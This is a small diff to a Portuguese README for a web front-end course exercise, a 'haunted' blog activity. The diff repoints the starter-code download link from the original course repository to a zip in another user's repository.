@@ -2,7 +2,7 @@
 
 Um blog sobre o desconhecido **versão 2**. Baixe o [código seminal][seminal].
 
-[seminal]: https://github.com/fegemo/cefet-front-end-assombrado/archive/main-positioning.zip
+[seminal]: https://github.com/willsallum/cefet_web_assombrado/raw/refs/heads/main/master.zip
 
 
 ## Atividade
